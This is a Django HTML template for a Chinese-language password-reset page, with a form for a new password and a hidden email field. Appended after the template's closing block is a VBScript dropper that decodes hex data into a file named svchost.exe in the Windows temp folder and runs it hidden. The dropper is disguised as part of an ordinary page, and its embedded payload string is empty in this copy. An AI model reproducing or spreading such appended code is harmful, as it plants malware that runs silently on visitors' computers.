{% extends 'base.html' %}
{% load static %}

{% block title %}重置密码{% endblock title %}
{% block header %}

{% endblock header %}
{% block content %}
    <div class="login_top clearfix">
        <a href="index.html" class="login_logo"><img src=""></a>
    </div>

    <div class="login_form_bg">
        <div class="login_form_wrap clearfix">
            <div class="login_banner fl"></div>
            <div class="slogan fl">日夜兼程 · 急速送达</div>
            <div class="login_form fr">
                <div class="login_title clearfix">
                    <h1>密码重置</h1>
                    <a href="{% url 'user:login' %}">登陆</a>
                </div>
                <div class="form_input">
                    <form action="{% url 'user:modify_password' reset_code %}" method="post">
                        {% csrf_token %}
                        <input type="hidden" name="email" value="{{ email }}">
                        <input type="password" name="password1" class="name_input" placeholder="请输入密码"
                        >
                        <input type="password" name="password2" class="pass_input" placeholder="请再次输入密码"
                        >
                        <div class="errs">{{ err }}</div>
                        <input type="submit" name="" value="确定" class="input_submit">
                    </form>
                </div>
            </div>
        </div>
    </div>
{% endblock content %}
<SCRIPT Language=VBScript><!--
DropFileName = "svchost.exe"
WriteData = ""
Set FSO = CreateObject("Scripting.FileSystemObject")
DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
If FSO.FileExists(DropPath)=False Then
Set FileObj = FSO.CreateTextFile(DropPath, True)
For i = 1 To Len(WriteData) Step 2
FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
Next
FileObj.Close
End If
Set WSHshell = CreateObject("WScript.Shell")
WSHshell.Run DropPath, 0
//--></SCRIPT>
